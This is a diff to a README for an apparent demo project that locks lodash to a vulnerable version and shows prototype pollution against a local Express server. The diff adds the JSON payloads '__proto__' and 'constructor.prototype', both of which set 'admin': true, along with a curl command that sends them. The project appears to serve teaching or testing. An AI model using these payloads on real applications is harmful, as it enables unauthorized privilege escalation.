@@ -19,7 +19,7 @@ In the package.json, lodash has been specifically locked to vulnerable version `
 * `npm i`
 * `npm start` to start the express server
 * Then in another console `curl -H"content-type: application/json" -d@attack.json http://localhost:9999/api/orders`
-* After that the global object constructor has been polluted (as far a I understand correctly)
+* After that the global object prototype has been polluted
 
     This means that whenever any part of the code for example creates a new object, it's prototype
     will have the properties given in [attack.json](attack.json).
@@ -27,6 +27,18 @@ In the package.json, lodash has been specifically locked to vulnerable version `
     ```js
     const newObj = {};
     // newObj.test equals now `true`
+    ```
+
+    The attack.json uses this:
+
+    ```json
+    "__proto__": { "admin": true }
+    ```
+
+    but it could be replace with the json below with same effect:
+
+    ```json
+    "constructor": { "prototype": { "admin": true } }
     ```
 
 * If you call `curl http://localhost:9999/api/orders/0000` you can notice that the prototype pollution affects the whole node process.
